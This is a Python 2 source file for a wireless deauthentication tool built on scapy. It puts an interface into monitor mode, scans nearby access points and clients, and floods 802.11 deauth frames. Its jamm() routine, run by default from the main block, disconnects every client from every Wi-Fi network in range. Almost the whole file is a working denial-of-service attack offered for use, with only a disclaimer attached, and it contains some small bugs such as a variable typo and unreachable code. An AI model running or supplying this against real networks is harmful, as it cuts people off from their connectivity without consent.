# written by Jan "Duchy" Neduchal
# 2018
# Licenced under the MIT licence
# Do whatever you want with the code, I don't really care. I <3 opensource.
# However note, that I, Jan Neduchal, take no responsibility for any malicious of your actions with this code
from random import randint
from multiprocessing import Process
from scapy.all import *
from gen_utils import switch_to_monitor
import os
import time

class Deauth:
    def __init__(self, iface = "wlan0"):
        self.networks = {}
        self.iface = iface
        self.processes = {}
        self.clients = []
        self.silent = False
        if os.system("iwconfig " + self.iface + "| grep Monitor >/dev/null 2>&1") != 0:
            try:
                self.iface = switch_to_monitor(iface)
            except invalidIface:
                raise Exception("invalidIface")

# Copied and modified from https://stackoverflow.com/questions/21613091/how-to-use-scapy-to-determine-wireless-encryption-type
    def __insert_ap(self, pkt):
        bssid = pkt[Dot11].addr3
        if bssid in self.networks:
            return
        p = pkt[Dot11Elt]
        cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                          "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
        ssid, channel = None, None
        crypto = set()
        while isinstance(p, Dot11Elt):
            if p.ID == 0:
                ssid = p.info
            elif p.ID == 3:
                channel = ord(p.info)
            elif p.ID == 48:
                crypto.add("WPA2")
            elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            p = p.payload
        if not crypto:
            if 'privacy' in cap:
                crypto.add("WEP")
            else:
                crypto.add("OPN")
        if not self.silent:
            print "AP: %r [%s], channed %d, %s" % (ssid, bssid, channel,' / '.join(crypto))
        self.networks[bssid] = (ssid, channel, crypto)

    def __channel_hopper(self): # hop channels to cover the whole 2.4GHz spectrum
        while True:             # (channels 1-13, sry Japan no 14 for you)
            channel = randint(1,13)
            os.system("iwconfig %s channel %d" % (self.iface, channel))
            time.sleep(1)

    def __scan_clients(self,pkt):
        if pkt.haslayer(Dot11):
            if pkt.addr1 and pkt.addr2 and akt.addr2 not in self.clients:
                print "Client: " + str(pkt.addr2) + " AP: " + str(pkt.addr1)
                self.clients.append(pkt.addr2)

    def scan_clients(self):
        channel_hop = Process(target = self.__channel_hopper)
        channel_hop.start()
        sniff(iface=self.iface, prn=self.__scan_clients, timeout = 15)
        del self.clients[:]
        channel_hop.terminate()
        channel_hop.join()

    def show_networks(self):   # a wrapper for the __insert_ap functon, spawns processes
        self.networks.clear()
        channel_hop = Process(target = self.__channel_hopper)
        channel_hop.start()
        sniff(iface=self.iface, prn=self.__insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p), timeout = 20)
        channel_hop.terminate()
        channel_hop.join() # free the memory

    def __deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
        pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
        client_2_ap_pkt = None
        if client != 'FF:FF:FF:FF:FF:FF':
            client_2_ap_pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth()
        print '[*] Sending Deauth to ' + client + ' from ' + bssid
        while count != 0:
            for i in range(64):
                sendp(pkt, iface = self.iface)
                if client != 'FF:FF:FF:FF:FF:FF':
                    sendp(client_2_ap_pkt, iface = self.iface)
                count -= 1

    def deauth(self, bssid, client = "FF:FF:FF:FF:FF:FF", count = -1):
        proc = Process(target = self.__deauth, args = (bssid,client,count,))
        proc.start()
        self.processes[str(proc.pid)] = str(bssid) + " " + str(client)

    def jamm(self, count = -1, client = 'FF:FF:FF:FF:FF:FF', new = False):
        if new:
            self.silent = True # don't display output
            self.show_networks()
            self.silent = False
        if len(self.networks) == 0:
            self.silent = True
            self.show_networks()
            self.silent = False
        if client == 'FF:FF:FF:FF:FF:FF':
            print "[*] Deauthing everyone!"
        else:
            print "[*] Deauthing " + client + " from every wifi in the area"
        time.sleep(1)
        for x in range(len(self.networks)):
            proc = Process(target = self.__deauth, args = (self.networks.items()[x][0],client,count,))
            proc.start()
            self.processes[str(proc.pid)] = str(self.networks.items()[x][0]) + " " + str(client)

    def stop(self, all = False):
        if len(self.processes) == 0:
            print "Nothing is running :/"
            return 0
        if all:
            for x in range(len(self.processes)):
                os.kill(int(self.processes.items()[x][0]), 9)
            return
        for x in range(len(self.processes)):
            print str((x+1)) + ". " + str(self.processes.items()[x][1])
        while True:
            try:
                choice = int(raw_input("Enter the number of the process you wish to stop (0 for exit): "))
            except KeyboardInterrupt:
                return
            except:
                print "Enter a valid number!"
                continue
            if choice == 0:
                return
            if choice > len(self.processes)+1 or choice < 0:
                print "Enter a number from the list!"
                continue
        os.kill(self.processes.items()[choice-1][0], 9)

###################################################################################################
#                init with deauth = Deauth(iface = "the wireless iface")                          #
###################################################################################################



if __name__ == "__main__":                      # you can run me with: python modules/deauth.py
    iface = raw_input("Enter a wireless iface: ")
    deauth = Deauth(iface)
    deauth.jamm()
